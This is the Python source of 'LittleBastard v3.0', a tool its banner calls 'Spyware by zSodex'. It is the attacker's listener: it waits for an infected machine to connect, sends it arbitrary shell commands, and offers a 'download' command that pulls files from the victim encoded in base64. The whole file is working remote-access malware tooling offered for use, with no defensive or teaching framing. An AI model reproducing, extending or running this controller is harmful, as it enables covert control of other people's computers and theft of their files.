#_*_ coding: utf8 _*_
import os
import socket
import subprocess
import time
import sys
import base64
from pystyle import *

 

banner = r'''
██▓     ██▓▄▄▄█████▓▄▄▄█████▓ ██▓    ▓█████                   
▓██▒    ▓██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓██▒    ▓█   ▀                   
▒██░    ▒██▒▒ ▓██░ ▒░▒ ▓██░ ▒░▒██░    ▒███                     
▒██░    ░██░░ ▓██▓ ░ ░ ▓██▓ ░ ▒██░    ▒▓█  ▄                   
░██████▒░██░  ▒██▒ ░   ▒██▒ ░ ░██████▒░▒████▒                  
░ ▒░▓  ░░▓    ▒ ░░     ▒ ░░   ░ ▒░▓  ░░░ ▒░ ░                  
░ ░ ▒  ░ ▒ ░    ░        ░    ░ ░ ▒  ░ ░ ░  ░                  
  ░ ░    ▒ ░  ░        ░        ░ ░      ░                     
    ░  ░ ░                        ░  ░   ░  ░                  
                                                               
 ▄▄▄▄    ▄▄▄        ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  ▓█████▄ 
▓█████▄ ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌
▒██▒ ▄██▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌
▒██░█▀  ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌
░▓█  ▀█▓ ▓█   ▓██▒▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒ 
 ░    ░   ░   ▒   ░  ░  ░    ░        ░   ▒     ░░   ░  ░ ░  ░ 
 ░            ░  ░      ░                 ░  ░   ░        ░    
      ░                                                 ░       v3.0 
      
      
[+] Spyware by zSodex'''


print(Colorate.Horizontal(Colors.blue_to_green, banner))


 
print()
print()

def main():
    lhost = Write.Input('[*] Server IP: ', Colors.green_to_red, interval=0.1)
    print()
    lport = int(Write.Input('[*] Port: ', Colors.green_to_red, interval=0.1))

    try:
        servidor  = socket.socket()
        servidor.bind((lhost, lport))
        servidor.listen(1)
        print()
        print(Colorate.Horizontal(Colors.blue_to_red, "\n[+] Waiting for Handshake..."))
    except OSError:
        print(f"[*] Ya existe una interfaz en escucha en el puerto {lport}")

    connected = False

 

    while True:
        if not connected:
            client, client_addr = servidor.accept()
            connected = True
    
        print()



# Little Bastard Core


        command = input(Colorate.Horizontal(Colors.blue_to_green, "little@bastard >> "))
    
        if command == "exit":
            command = command.encode()
            client.send(command)
             
            print("[+] Secure Exit Detected")
            print("[+] Thanks for using LittleBastard :)")
            servidor.close() 
            time.sleep(2)
            sys.exit()
        

        elif command[:8] == "download":
            command = command.encode()
            client.send(command)

            with open(command[9:],'wb') as file_d:
                try:
                    datos = client.recv(30000)
                    file_d.write(base64.b64decode(datos))
                    print(f"\n[+] File Downloaded in {command[9:]}")
                    continue
                except:
                    print("[-] File not found")
                    continue


    

        elif not command or command == " ":
            print("[-] No command detected")
        
            continue

        else:
            try:
                command = command.encode()
                client.send(command)

            except:
            
                continue
        




    
    

   


        try:
            output = client.recv(1024)
            output = output.decode()
            print(f"""

{output}

""")

        except:
            pass


        if not output:
            pass

     
     
 
    
   

main()